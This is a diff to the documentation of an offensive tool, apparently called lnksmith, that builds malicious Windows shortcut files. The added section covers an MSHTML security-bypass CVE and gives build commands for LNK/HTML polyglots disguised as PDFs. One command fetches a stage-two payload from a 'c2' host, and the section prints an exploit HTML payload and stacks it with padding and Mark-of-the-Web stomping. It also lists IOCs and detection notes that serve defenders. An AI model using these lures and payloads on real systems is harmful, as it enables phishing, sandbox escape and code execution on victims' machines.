@@ -17,6 +17,7 @@ access, persistence, credential harvesting, and evasion using `.lnk` files.
 - [LOLBin Proxy Execution](#lolbin-proxy-execution)
 - [Icon Masquerading](#icon-masquerading)
 - [LNK/HTA Polyglot](#lnkhta-polyglot)
+- [MSHTML Polyglot (CVE-2026-21513)](#mshtml-polyglot-cve-2026-21513)
 - [Binary Padding / File Bloating](#binary-padding--file-bloating)
 - [MotW Bypass / LNK Stomping](#motw-bypass--lnk-stomping)
 - [NTLM Hash Theft](#ntlm-hash-theft)
@@ -196,6 +197,117 @@ lnksmith build "C:\Windows\System32\mshta.exe" \
 
 The file appears as `meeting-notes.pdf`, opens `mshta.exe` which re-reads the
 `.lnk` file and parses the trailing HTA content.
+
+---
+
+## MSHTML Polyglot (CVE-2026-21513)
+
+**CVE-2026-21513** (CVSS 8.8) is an MSHTML security feature bypass exploited
+in the wild by APT28 before the February 2026 Patch Tuesday. The attack uses
+a LNK+HTML polyglot: a `.lnk` targeting `mshta.exe` with an HTML payload
+appended after the terminal block. The embedded HTML creates nested
+`about:blank` iframes and calls `document.Script.open()` to trigger the
+vulnerable `_AttemptShellExecuteForHlinkNavigate` code path in `ieframe.dll`,
+bypassing Mark of the Web (MotW) and IE Enhanced Security Configuration (ESC)
+to reach `ShellExecuteExW` outside the browser sandbox.
+
+> **Note**: Patched February 2026. The LNK polyglot delivery mechanism
+> remains useful for testing detection coverage and in pre-patch environments.
+
+### Using --embed-html (recommended)
+
+`--embed-html` is a convenience flag that reads an HTML file, appends it after
+the terminal block, and auto-sets arguments to the output filename for
+self-referencing. One flag replaces the manual `--append` + `--arguments`
+coordination.
+
+```bash
+lnksmith build "C:\Windows\System32\mshta.exe" \
+    -o "document.pdf.lnk" \
+    --embed-html exploit.html \
+    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
+    --show minimized
+```
+
+This produces a file that:
+
+1. Appears as `document.pdf` with a PDF icon
+2. Opens `mshta.exe` with arguments `document.pdf.lnk` (auto-derived)
+3. `mshta.exe` re-reads the `.lnk` and parses the trailing HTML
+
+To override the auto-derived arguments (e.g., to point at a remote URL
+instead of self-referencing), pass `--arguments` explicitly:
+
+```bash
+lnksmith build "C:\Windows\System32\mshta.exe" \
+    -o "report.pdf.lnk" \
+    --embed-html local-fallback.html \
+    --arguments "http://c2/stage2.html" \
+    --show minimized
+```
+
+### Using %SELF% token
+
+The `%SELF%` token in `--arguments` is replaced with the output filename at
+build time. This avoids duplicating the filename and works with any
+self-referencing pattern, not just `--embed-html`.
+
+```bash
+lnksmith build "C:\Windows\System32\mshta.exe" \
+    -o "meeting-notes.pdf.lnk" \
+    --arguments "%SELF%" \
+    --append exploit.html \
+    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
+    --show minimized
+```
+
+`%SELF%` expands to the basename of the output path (here,
+`meeting-notes.pdf.lnk`).
+
+### Example HTML payload (CVE-2026-21513)
+
+The exploit creates an `htmlfile` ActiveXObject via a nested window context,
+writes HTML with two `about:blank` iframes, then calls
+`document.Script.open()` from the second iframe to reach the vulnerable
+navigation path:
+
+```html
+<!-- exploit.html -->
+<html><body>
+<script>
+h1 = new window[0].ActiveXObject('htmlfile');
+h1.open();
+h1.write('<html><body>'
+  + '<iframe src="about:blank"></iframe>'
+  + '<iframe src="about:blank"></iframe>'
+  + '<script defer>window[1].document.Script.open("http:///","_parent")<\/script>'
+  + '</body></html>');
+h1.close();
+</script>
+</body></html>
+```
+
+### Combining with other techniques
+
+Stack `--embed-html` with binary padding and MotW stomping:
+
+```bash
+lnksmith build "C:\Windows\System32\mshta.exe" \
+    -o "Q3 Report.pdf.lnk" \
+    --embed-html exploit.html \
+    --pad-size 100MB \
+    --stomp-motw dot \
+    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
+    --show minimized
+```
+
+### IOCs (Akamai, Feb 2026)
+
+| Name             | Indicator                                                          |
+| ---------------- | ------------------------------------------------------------------ |
+| document.doc.LnK | `aefd15e3c395edd16ede7685c6e97ca0350a702ee7c8585274b457166e86b1fa` |
+| Domain           | `wellnesscaremed[.]com`                                            |
+| MITRE Techniques | T1204.001, T1566.001, T1218.005                                    |
 
 ---
 
@@ -552,6 +664,7 @@ lnksmith build "C:\Windows\System32\cmd.exe" \
 ```
 
 This produces a file that:
+
 1. Appears as `Q3 Earnings Report.pdf` with a PDF icon
 2. Shows ~400 spaces in the Properties arguments field
 3. Bypasses SmartScreen via MotW stripping
@@ -569,10 +682,10 @@ This produces a file that:
 | LNK Icon Smuggle  | T1027.012   | `--icon`, `--icon-env`, NTLM theft |
 | Binary Padding    | T1027.001   | `--pad-size`                       |
 | Shortcut Mod      | T1547.009   | Startup folder, hijacking          |
-| Mshta Proxy       | T1218.005   | `--append` polyglot                |
+| Mshta Proxy       | T1218.005   | `--append`, `--embed-html`         |
 | Rundll32 Proxy    | T1218.011   | LOLBin target                      |
 | PowerShell        | T1059.001   | `--arguments` download cradle      |
-| Forced Auth       | T1187        | UNC icon/target paths              |
+| Forced Auth       | T1187       | UNC icon/target paths              |
 | MotW Bypass       | T1553.005   | `--stomp-motw`                     |
 | Env Var Resolve   | T1027.010   | `--env-target`, `--icon-env`       |
 | Hide Artifacts    | T1564.001   | `--show minimized`, attrs 0x06     |
@@ -592,6 +705,10 @@ This produces a file that:
 - `.lnk` files in user-writable locations with document/folder icons.
 - `TrackerDataBlock` metadata mismatches (hostname vs environment).
 - Process creation: `explorer.exe` -> LOLBin with download commands.
+- `mshta.exe` child creating `htmlfile` ActiveXObject or spawning nested
+  `ieframe.dll` / MSHTML contexts (CVE-2026-21513 indicator).
+- `.lnk` files with HTML/script content appended past the terminal block
+  (polyglot detection via file entropy or trailing content scan).
 
 ### OPSEC considerations
 
